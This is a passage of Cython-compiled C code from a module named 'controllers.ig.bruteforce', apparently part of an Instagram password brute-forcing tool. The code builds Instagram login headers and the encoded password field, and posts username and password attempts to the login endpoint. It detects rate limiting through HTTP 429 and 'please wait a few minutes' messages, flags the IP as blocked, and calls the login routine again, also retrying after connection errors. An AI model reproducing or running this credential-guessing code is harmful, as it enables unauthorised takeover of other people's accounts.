  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_update); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 324, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 326, __pyx_L1_error) }
  __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_rollout_hash); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_x_instagram_ajax, __pyx_t_10) < 0) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

   
  if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 327, __pyx_L1_error) }
  __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_nonce); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 327, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_x_ig_www_claim, __pyx_t_10) < 0) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_x_requested_with, __pyx_n_u_XMLHttpRequest) < 0) __PYX_ERR(0, 326, __pyx_L1_error)

   
  __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_random); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 329, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 329, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__17, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 329, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 329, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_x_asbd_id, __pyx_t_4) < 0) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

   
  if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 330, __pyx_L1_error) }
  __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_response, __pyx_n_u_config); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 330, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_10 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_u_csrf_token); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 330, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_x_csrftoken, __pyx_t_10) < 0) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 326, __pyx_L1_error)
  __pyx_t_10 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_10)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_10);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_10, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_1);
  __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 324, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

   
  __pyx_t_3 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = PyTuple_New(4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_14 = 0;
  __pyx_t_15 = 127;
  __Pyx_INCREF(__pyx_kp_u_PWD_INSTAGRAM_BROWSER_0);
  __pyx_t_14 += 25;
  __Pyx_GIVEREF(__pyx_kp_u_PWD_INSTAGRAM_BROWSER_0);
  PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_PWD_INSTAGRAM_BROWSER_0);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_datetime); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_now); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_13))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_13);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_13, function);
    }
  }
  __pyx_t_10 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_10);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_timestamp); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __pyx_t_10 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
    __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_13);
    if (likely(__pyx_t_10)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
      __Pyx_INCREF(__pyx_t_10);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_13, function);
    }
  }
  __pyx_t_1 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __pyx_t_13 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_13), __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__18);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__18);
  PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__18);
  __pyx_t_1 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_password), __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_1);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_5, 4, __pyx_t_14, __pyx_t_15); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_enc_password, __pyx_t_1) < 0) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_username, __pyx_v_username) < 0) __PYX_ERR(0, 335, __pyx_L1_error)

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_queryParams, __pyx_t_1) < 0) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_optIntoOneTap, Py_False) < 0) __PYX_ERR(0, 335, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_stopDeletionNonce, __pyx_kp_u__6) < 0) __PYX_ERR(0, 335, __pyx_L1_error)

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_trustedDeviceRecords, __pyx_t_1) < 0) __PYX_ERR(0, 335, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_payload = ((PyObject*)__pyx_t_3);
  __pyx_t_3 = 0;

   
  while (1) {

     
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_6);
        {

         
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_http, __pyx_n_s_post); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 345, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ig); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 345, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_login_ajax_url); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 345, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = PyTuple_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 345, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_5);
        __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 345, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_data, __pyx_v_payload) < 0) __PYX_ERR(0, 345, __pyx_L20_error)
        __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_1, __pyx_t_5); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 345, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_13);
        __pyx_t_13 = 0;

         
        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_status_code); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_5 = __Pyx_PyInt_EqObjC(__pyx_t_13, __pyx_int_429, 0x1AD, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_16 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (!__pyx_t_16) {
        } else {
          __pyx_t_2 = __pyx_t_16;
          goto __pyx_L29_bool_binop_done;
        }
        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_lower); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_13)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_13);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_5 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_16 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_harap_tunggu_beberapa_menit, __pyx_t_5, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_17 = (__pyx_t_16 != 0);
        if (!__pyx_t_17) {
        } else {
          __pyx_t_2 = __pyx_t_17;
          goto __pyx_L29_bool_binop_done;
        }
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_lower); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_13);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_13, function);
          }
        }
        __pyx_t_5 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_please_wait_a_few_minutes, __pyx_t_5, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 346, __pyx_L20_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_16 = (__pyx_t_17 != 0);
        __pyx_t_2 = __pyx_t_16;
        __pyx_L29_bool_binop_done:;
        if (__pyx_t_2) {

           
          if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_IP_IS_BLOCKED, Py_True) < 0) __PYX_ERR(0, 347, __pyx_L20_error)

           
          __Pyx_XDECREF(__pyx_r);
          __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 348, __pyx_L20_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_1 = NULL;
          __pyx_t_11 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
              __pyx_t_11 = 1;
            }
          }
          #if CYTHON_FAST_PYCALL
          if (PyFunction_Check(__pyx_t_13)) {
            PyObject *__pyx_temp[5] = {__pyx_t_1, __pyx_v_username, __pyx_v_password, __pyx_v_retries, __pyx_v_user_agent};
            __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_13, __pyx_temp+1-__pyx_t_11, 4+__pyx_t_11); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 348, __pyx_L20_error)
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GOTREF(__pyx_t_5);
          } else
          #endif
          #if CYTHON_FAST_PYCCALL
          if (__Pyx_PyFastCFunction_Check(__pyx_t_13)) {
            PyObject *__pyx_temp[5] = {__pyx_t_1, __pyx_v_username, __pyx_v_password, __pyx_v_retries, __pyx_v_user_agent};
            __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_13, __pyx_temp+1-__pyx_t_11, 4+__pyx_t_11); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 348, __pyx_L20_error)
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GOTREF(__pyx_t_5);
          } else
          #endif
          {
            __pyx_t_3 = PyTuple_New(4+__pyx_t_11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 348, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_3);
            if (__pyx_t_1) {
              __Pyx_GIVEREF(__pyx_t_1); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_1); __pyx_t_1 = NULL;
            }
            __Pyx_INCREF(__pyx_v_username);
            __Pyx_GIVEREF(__pyx_v_username);
            PyTuple_SET_ITEM(__pyx_t_3, 0+__pyx_t_11, __pyx_v_username);
            __Pyx_INCREF(__pyx_v_password);
            __Pyx_GIVEREF(__pyx_v_password);
            PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_11, __pyx_v_password);
            __Pyx_INCREF(__pyx_v_retries);
            __Pyx_GIVEREF(__pyx_v_retries);
            PyTuple_SET_ITEM(__pyx_t_3, 2+__pyx_t_11, __pyx_v_retries);
            __Pyx_INCREF(__pyx_v_user_agent);
            __Pyx_GIVEREF(__pyx_v_user_agent);
            PyTuple_SET_ITEM(__pyx_t_3, 3+__pyx_t_11, __pyx_v_user_agent);
            __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_3, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 348, __pyx_L20_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          }
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_r = __pyx_t_5;
          __pyx_t_5 = 0;
          goto __pyx_L24_try_return;

           
        }

         
          {
          __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 350, __pyx_L20_error)
          __Pyx_GOTREF(__pyx_t_13);
          __pyx_t_3 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_13);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_13, function);
            }
          }
          __pyx_t_5 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 350, __pyx_L20_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __Pyx_DECREF_SET(__pyx_v_response, __pyx_t_5);
          __pyx_t_5 = 0;

           
          if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_IP_IS_BLOCKED, Py_False) < 0) __PYX_ERR(0, 351, __pyx_L20_error)

           
          goto __pyx_L25_try_break;
        }

         
      }
      __pyx_L20_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

       
      __Pyx_ErrFetch(&__pyx_t_5, &__pyx_t_13, &__pyx_t_3);
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 353, __pyx_L22_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_ChunkedEncodingError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 353, __pyx_L22_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Timeout); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 353, __pyx_L22_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_11 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_1) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_10) || __Pyx_PyErr_GivenExceptionMatches(__pyx_t_5, __pyx_t_4);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_ErrRestore(__pyx_t_5, __pyx_t_13, __pyx_t_3);
      __pyx_t_5 = 0; __pyx_t_13 = 0; __pyx_t_3 = 0;
      if (__pyx_t_11) {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_13, &__pyx_t_5) < 0) __PYX_ERR(0, 353, __pyx_L22_except_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_GOTREF(__pyx_t_5);

         
        goto __pyx_L33_except_continue;
        __pyx_L33_except_continue:;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        goto __pyx_L26_try_continue;
      }

       
        {
        __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_13, &__pyx_t_3) < 0) __PYX_ERR(0, 355, __pyx_L22_except_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_GOTREF(__pyx_t_3);

         
        __Pyx_XDECREF(__pyx_r);
        __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 356, __pyx_L22_except_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_v_retries, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 356, __pyx_L22_except_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_9 = NULL;
        __pyx_t_11 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_10, function);
            __pyx_t_11 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_10)) {
          PyObject *__pyx_temp[5] = {__pyx_t_9, __pyx_v_username, __pyx_v_password, __pyx_t_1, __pyx_v_user_agent};
          __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_11, 4+__pyx_t_11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L22_except_error)
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_10)) {
